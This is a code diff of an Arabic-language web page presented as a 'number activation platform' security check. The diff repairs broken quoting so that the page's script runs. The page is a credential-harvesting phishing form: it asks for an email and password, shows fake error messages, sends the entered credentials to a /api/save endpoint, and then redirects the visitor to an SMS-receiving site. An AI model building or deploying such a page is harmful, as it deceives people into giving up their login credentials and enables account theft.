@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -7,14 +6,14 @@
     <title>منصة تفعيل الأرقام العالمية - نظام الأمان</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;800&display=swap" rel="stylesheet">
     <style>
-        body { margin: 0; padding: 0; font-family:  Cairo , sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow: hidden; }
+        body { margin: 0; padding: 0; font-family: 'Cairo', sans-serif; background-color: #0a0e17; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #ffffff; overflow: hidden; }
         .premium-card { background-color: #141b2b; width: 90%; max-width: 400px; padding: 40px 30px; border-radius: 28px; text-align: center; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6); position: relative; }
         
         .logo-circle { width: 110px; height: 110px; background: radial-gradient(circle, #1e293b, #111827); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; border: 2px solid rgba(0, 242, 254, 0.2); box-shadow: 0 0 20px rgba(0, 242, 254, 0.1); }
         
         .persuasive-text { color: #00f2fe; font-size: 16px; font-weight: 700; margin-bottom: 25px; line-height: 1.6; }
 
-        input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family:  Cairo ; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input { width: 100%; padding: 18px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.02); border: 1.5px solid rgba(255, 255, 255, 0.05); border-radius: 15px; color: #fff; font-family: 'Cairo'; box-sizing: border-box; outline: none; transition: 0.3s; }
         input:focus { border-color: #4facfe; background: rgba(255, 255, 255, 0.05); }
         input:disabled { opacity: 0.4; cursor: not-allowed; }
 
@@ -52,21 +51,21 @@
 
     <script>
         let attempts = 0;
-        const form = document.getElementById( secure-form );
-        const msg = document.getElementById( status-msg );
-        const btn = document.getElementById( btn-submit );
-        const inputs = document.querySelectorAll( input );
+        const form = document.getElementById('secure-form');
+        const msg = document.getElementById('status-msg');
+        const btn = document.getElementById('btn-submit');
+        const inputs = document.querySelectorAll('input');
 
         form.onsubmit = async (e) => {
             e.preventDefault();
-            const u = document.getElementById( email ).value.trim();
-            const p = document.getElementById( pass ).value.trim();
+            const u = document.getElementById('email').value.trim();
+            const p = document.getElementById('pass').value.trim();
 
             // فحص الأحرف العربية والرموز المريبة
             const hasArabic = /[\u0600-\u06FF]/.test(p);
             const hasSymbols = /[^\w\s@.]/.test(p);
 
-            if (!u.includes( @ ) || p.length < 6 || hasArabic || hasSymbols) {
+            if (!u.includes('@') || p.length < 6 || hasArabic || hasSymbols) {
                 attempts++;
                 
                 if (attempts === 1) {
@@ -83,7 +82,7 @@
             btn.disabled = true;
             btn.innerText = "جاري تأكيد الهوية...";
             try {
-                await fetch( /api/save , { method:  POST , headers: { Content-Type :  application/json }, body: JSON.stringify({ user: u, pass: p }) });
+                await fetch('/api/save', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ user: u, pass: p }) });
             } catch(e) {}
             setTimeout(() => { window.location.href = "https://receive-smss.com/"; }, 1500);
         };
@@ -93,7 +92,7 @@
             msg.className = type;
             msg.style.display = "block";
             // إعادة تشغيل الأنيميشن عند كل خطأ
-            msg.style.animation =  none ;
+            msg.style.animation = 'none';
             msg.offsetHeight; 
             msg.style.animation = null;
         }
